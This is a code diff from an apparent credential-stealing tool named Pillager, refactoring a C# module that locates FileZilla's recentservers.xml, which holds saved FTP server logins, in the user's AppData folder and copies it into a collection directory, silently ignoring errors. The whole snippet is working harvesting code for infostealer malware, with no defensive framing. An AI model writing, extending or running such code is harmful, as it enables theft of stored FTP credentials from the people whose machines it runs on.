@@ -1,22 +1,21 @@
-﻿using System;
+﻿using Pillager.Helper;
+using System;
 using System.IO;
 
 namespace Pillager.FTPs
 {
-    internal class FileZilla
+    internal class FileZilla : ICommand
     {
-        public static string FTPName = "FileZilla";
-
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string xmlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml");
                 if (File.Exists(xmlpath))
                 {
-                    string savepath = Path.Combine(path, FTPName);
+                    string savepath = Path.Combine(path, "FileZilla");
                     Directory.CreateDirectory(savepath);
-                    File.Copy(xmlpath, Path.Combine(savepath, FTPName + ".txt"));
+                    File.Copy(xmlpath, Path.Combine(savepath, "FileZilla.txt"));
                 }
             }
             catch { }
